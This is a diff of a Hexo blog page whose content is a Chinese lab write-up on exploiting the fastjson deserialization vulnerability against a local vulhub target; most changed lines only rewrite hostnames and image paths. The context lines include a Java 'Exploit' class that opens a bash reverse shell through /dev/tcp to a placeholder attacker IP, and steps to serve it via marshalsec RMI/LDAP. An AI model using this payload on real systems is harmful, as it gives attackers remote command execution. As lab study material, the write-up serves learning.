@@ -17,45 +17,45 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"omicron.fun","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta name="description" content="FastJson是alibaba开源的一款开源的高性能的JSON库，用于将java对象转换为json形式，也可以用来将json转换为java对象，很多公司都在使用，于2017年4月18号爆出存在此漏洞。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2020.07.13.fastjson反序列化漏洞学习笔记">
-<meta property="og:url" content="http://example.com/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:url" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="FastJson是alibaba开源的一款开源的高性能的JSON库，用于将java对象转换为json形式，也可以用来将json转换为java对象，很多公司都在使用，于2017年4月18号爆出存在此漏洞。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/.com//2020-07-13-15-06-26.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-13-15-08-01.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-13-15-11-42.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-13-16-02-02.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-13-15-16-21.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-13-16-06-12.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-13-16-06-49.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-13-16-10-56.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-13-17-02-04.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-21-22-20.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-21-25-34.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-21-30-03.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-21-36-07.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-21-37-53.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-13-16-36-50.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-21-45-18.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-21-46-19.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-21-54-27.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-21-55-17.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-21-59-09.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-22-00-00.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-22-02-21.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-22-05-05.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-22-12-57.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-22-26-51.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-22-28-35.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-22-07-42.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-13-23-26-17.png">
-<meta property="og:image" content="http://example.com/.com//2020-07-14-14-39-24.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-15-06-26.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-15-08-01.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-15-11-42.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-16-02-02.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-15-16-21.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-16-06-12.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-16-06-49.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-16-10-56.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-17-02-04.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-22-20.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-25-34.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-30-03.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-36-07.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-37-53.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-16-36-50.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-45-18.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-46-19.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-54-27.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-55-17.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-59-09.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-00-00.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-02-21.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-05-05.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-12-57.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-26-51.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-28-35.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-07-42.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-23-26-17.png">
+<meta property="og:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-14-39-24.png">
 <meta property="article:published_time" content="2020-07-13T06:53:26.000Z">
 <meta property="article:modified_time" content="2020-07-27T00:58:56.000Z">
 <meta property="article:author" content="John Doe">
@@ -65,9 +65,9 @@
 <meta property="article:tag" content="java">
 <meta property="article:tag" content="fastjson">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/.com//2020-07-13-15-06-26.png">
+<meta name="twitter:image" content="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-15-06-26.png">
 
-<link rel="canonical" href="http://example.com/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+<link rel="canonical" href="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
 
 
 <script id="page-configurations">
@@ -185,7 +185,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+    <link itemprop="mainEntityOfPage" href="http://omicron.fun/2020/07/13/11_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -254,18 +254,18 @@
 <li>小弟在实际操作过程中一直都是针对有漏洞的靶场进行探测，实际操作中没有遇到无回显的fastjson，所以没有记录无回显的结果</li>
 </ul>
 <h3 id="构造特殊POST请求包"><a href="#构造特殊POST请求包" class="headerlink" title="构造特殊POST请求包"></a>构造特殊POST请求包</h3><ul>
-<li>首先是正常的GET请求包<br><img src="/.com//2020-07-13-15-06-26.png"></li>
-<li>然后我们修改GET请求为POST请求，修改data为一个没有闭合的大括号<code>&#123;</code>，检查报错信息<br><img src="/.com//2020-07-13-15-08-01.png"></li>
+<li>首先是正常的GET请求包<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-15-06-26.png"></li>
+<li>然后我们修改GET请求为POST请求，修改data为一个没有闭合的大括号<code>&#123;</code>，检查报错信息<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-15-08-01.png"></li>
 </ul>
 <h3 id="通过CURL观察"><a href="#通过CURL观察" class="headerlink" title="通过CURL观察"></a>通过CURL观察</h3><ul>
 <li>我也不知道这是用来观察fastjson的，还是说用来看反序列化解析的，总是老老实实记录下来，以后修改~</li>
 <li>观察正常的页面Json数据之后，直接通过CURL构造一个POST请求到服务器上，修改回显<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://your-ip:8090/ -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data <span class="string">&#x27;&#123;&quot;name&quot;:&quot;hello&quot;, &quot;age&quot;:20&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-<img src="/.com//2020-07-13-15-11-42.png"></li>
+<img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-15-11-42.png"></li>
 <li>可以看到回显正是我们POST的值</li>
 </ul>
 <h3 id="判断fasejson和jackson"><a href="#判断fasejson和jackson" class="headerlink" title="判断fasejson和jackson"></a>判断fasejson和jackson</h3><ul>
 <li>他们最大的区别在于Jackson相对比较严格，强制key和javabean属性对齐，只能少不能多key</li>
-<li>fastjson多key不会报错，我们可以多构造一个，因此大概率判断为fastjson（没有其它json解析库的情况下）<br><img src="/.com//2020-07-13-16-02-02.png"></li>
+<li>fastjson多key不会报错，我们可以多构造一个，因此大概率判断为fastjson（没有其它json解析库的情况下）<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-16-02-02.png"></li>
 </ul>
 <h2 id="漏洞限制"><a href="#漏洞限制" class="headerlink" title="漏洞限制"></a>漏洞限制</h2><ul>
 <li>要想使用Templateslmpl的_bytecodes属性执行任意命令，有以下条件：<ul>
@@ -276,17 +276,17 @@
 </li>
 </ul>
 <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
-<li>可以直接采用<a target="_blank" rel="noopener" href="http://vulfocus.fofa.so/">vulfocus</a>，搭建好的靶场来测试<br><img src="/.com//2020-07-13-15-16-21.png"></li>
+<li>可以直接采用<a target="_blank" rel="noopener" href="http://vulfocus.fofa.so/">vulfocus</a>，搭建好的靶场来测试<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-15-16-21.png"></li>
 <li>也可以采用<a target="_blank" rel="noopener" href="https://vulhub.org/">Vulhub+Docker容器</a>的方式来搭建<h2 id="环境详情"><a href="#环境详情" class="headerlink" title="环境详情"></a>环境详情</h2></li>
 <li>靶机：kali-linux IP：10.0.0.2（NAT模式）</li>
 <li>攻击机：Win10本机<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3></li>
 <li>首先，虚拟机最好先采用桥接模式，这样才能在<code>docker-compose up -d</code>的时候网络更顺畅…</li>
 <li>然后在后面验证漏洞的时候建议切换回来NAT模式，更安全稳定一些<del>而且我的NAT模式是静态IP的配置。</del>这样更容易分清楚攻击步骤~~</li>
-<li><strong>这个反序列化漏洞对JDK版本有要求</strong>…我的kali默认是采用的11.0版本…但是需求是1.8版本…连报错信息都看起来不美好了…<br><img src="/.com//2020-07-13-16-06-12.png"></li>
-<li>真实原因是因为1.2.24的报错信息就是这样的<br><img src="/.com//2020-07-13-16-06-49.png"></li>
+<li><strong>这个反序列化漏洞对JDK版本有要求</strong>…我的kali默认是采用的11.0版本…但是需求是1.8版本…连报错信息都看起来不美好了…<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-16-06-12.png"></li>
+<li>真实原因是因为1.2.24的报错信息就是这样的<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-16-06-49.png"></li>
 </ul>
 <h2 id="Kali修改Java版本"><a href="#Kali修改Java版本" class="headerlink" title="Kali修改Java版本"></a>Kali修改Java版本</h2><ul>
-<li>上图镇楼<br><img src="/.com//2020-07-13-16-10-56.png"></li>
+<li>上图镇楼<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-16-10-56.png"></li>
 <li>直接代码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure></li>
 <li>kali预装8和11两个版本真是太强了~</li>
 </ul>
@@ -297,52 +297,52 @@
 <li>下载marshalsec项目<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br></pre></td></tr></table></figure></li>
 <li>安装配置mvn，直接cd到marshalsec目录下开始编译<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure></li>
 <li>报错没有JDK环境，检查javac，果然没有javac只能执行java，直接安装jdk-1.8<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure></li>
-<li>再次检查javac，成功<br><img src="/.com//2020-07-13-17-02-04.png"></li>
-<li>可以在服务器上写我们恶意的java类，也可以在我们的主机上编译好再上传<br><img src="/.com//2020-07-14-21-22-20.png"></li>
+<li>再次检查javac，成功<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-17-02-04.png"></li>
+<li>可以在服务器上写我们恶意的java类，也可以在我们的主机上编译好再上传<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-22-20.png"></li>
 <li>这里我们直接写反弹shell的payload<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/&lt;You-IP&gt;/&lt;Open-Port&gt; 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><code>javac</code>编译出恶意的class类，注意java的规则，必须要类名跟文件名一致，还有就是<code>exec()</code>这个函数的参数不要弄错了，第一个参数是<code>command</code><br><img src="/.com//2020-07-14-21-25-34.png"></li>
+<li><code>javac</code>编译出恶意的class类，注意java的规则，必须要类名跟文件名一致，还有就是<code>exec()</code>这个函数的参数不要弄错了，第一个参数是<code>command</code><br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-25-34.png"></li>
 <li>注意我的当前目录，mvn编译出来，用来挂载rmi服务的jar包在<code>target</code>文件夹中，所以执行中加上路径。</li>
 <li>执行命令，启动服务并且挂载我们的shell.class<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer &lt;codebase&gt;<span class="comment">#&lt;class&gt; [&lt;port&gt;]</span></span><br></pre></td></tr></table></figure></li>
-<li>可以看到开始监听10.0.0.1的10001端口，<del>但是我最后没有采用这种方式来传递payload</del><br><img src="/.com//2020-07-14-21-30-03.png"></li>
+<li>可以看到开始监听10.0.0.1的10001端口，<del>但是我最后没有采用这种方式来传递payload</del><br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-30-03.png"></li>
